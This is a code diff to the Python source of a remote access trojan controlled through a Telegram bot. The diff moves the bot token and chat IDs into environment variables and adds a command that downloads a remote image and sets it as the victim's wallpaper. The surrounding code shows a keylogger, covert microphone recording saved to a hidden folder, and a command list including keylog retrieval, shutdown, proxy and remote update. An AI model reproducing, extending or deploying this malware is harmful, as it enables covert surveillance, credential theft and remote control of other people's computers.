@@ -23,15 +23,16 @@ import pyHook, pythoncom 								# keylogger
 import socket											# internal IP
 import getpass											# get username
 import collections
+import urllib											# wallpaper	
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-#token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
+#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
+token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'Portal'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = ''
-#known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
+known_ids = []
+known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
 														# ---------------------------------------------
@@ -70,7 +71,7 @@ def encode(file):
 	t = open(file, "w+")
 	t.write(encodedBytes)
 	t.close()
-
+	
 def decode(file):
 	f = open(file)
 	data = f.read()
@@ -83,19 +84,19 @@ def decode(file):
 	t = open(file, "w+")
 	t.write(decodedBytes)
 	t.close()
-
+	
 def runStackedSchedule(everyNSeconds):
 	for k in schedule.keys():
 		if k < datetime.datetime.now():
 			handle(schedule[k])
 			del schedule[k]
 	threading.Timer(everyNSeconds, runStackedSchedule).start()
-
+	
 def internalIP():
 	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	internal_ip.connect(('google.com', 0))
 	return internal_ip.getsockname()[0]
-
+	
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
 def get_curr_window():
@@ -114,7 +115,7 @@ def get_curr_window():
 		kernel32.CloseHandle(hwnd)
 		kernel32.CloseHandle(h_process)
 		return pid_info
-
+	
 def pressed_chars(event):
 	data = None
 	global curr_window
@@ -175,7 +176,7 @@ def pressed_chars(event):
 			# fp.write(data)
 			# fp.close()
 		# return not keyboardFrozen
-
+	
 def split_string(n, st):
 	lst = ['']
 	for i in str(st):
@@ -185,7 +186,7 @@ def split_string(n, st):
 		else:
 			lst += [i]
 	return lst
-
+	
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
@@ -193,7 +194,7 @@ def send_safe_message(bot, chat_id, message):
 			break
 		except:
 			pass
-
+	
 def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
@@ -309,12 +310,12 @@ def handle(msg):
 					SECONDS = int(command.replace('/hear','').strip())
 				except:
 					SECONDS = 5
-
+				 
 				CHANNELS = 2
 				CHUNK = 1024
 				FORMAT = pyaudio.paInt16
 				RATE = 44100
-
+				 
 				audio = pyaudio.PyAudio()
 				bot.sendChatAction(chat_id, 'typing')
 				stream = audio.open(format=FORMAT, channels=CHANNELS,
@@ -327,7 +328,7 @@ def handle(msg):
 				stream.stop_stream()
 				stream.close()
 				audio.terminate()
-
+				
 				wav_path = hide_folder + '\\mouthlogs.wav'
 				waveFile = wave.open(wav_path, 'wb')
 				waveFile.setnchannels(CHANNELS)
@@ -500,8 +501,12 @@ def handle(msg):
 				command = command.strip()
 				if len(command) == 0:
 					response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
+				elif command.startswith('http'):
+					image = command.rsplit('/',1)[1]
+					image = hide_folder + '/' + image
+					urllib.urlretrieve(command, image)
+					ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 3)
 				else:
-					print command
 					ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
 					response = 'Wallpaper succesfully set.'
 			elif command == '/help':
@@ -521,7 +526,6 @@ def handle(msg):
 						'/keylogs':'', \
 						'/ls':'[target_folder]', \
 						'/msg_box':'<text>', \
-						'/nslookup':'', \
 						'/pc_info':'', \
 						'/play':'<youtube_videoId>', \
 						'/proxy':'', \
@@ -532,7 +536,8 @@ def handle(msg):
 						'/shutdown':'', \
 						'/tasklist':'', \
 						'/to':'<target_computer>, [other_target_computer]',\
-						'/update':''}
+						'/update':'',\
+						'/wallpaper':'<target_file>'}
 				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
@@ -557,7 +562,7 @@ def handle(msg):
 			responses = split_string(4096, response)
 			for resp in responses:
 				send_safe_message(bot, chat_id, resp)#
-
+			
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
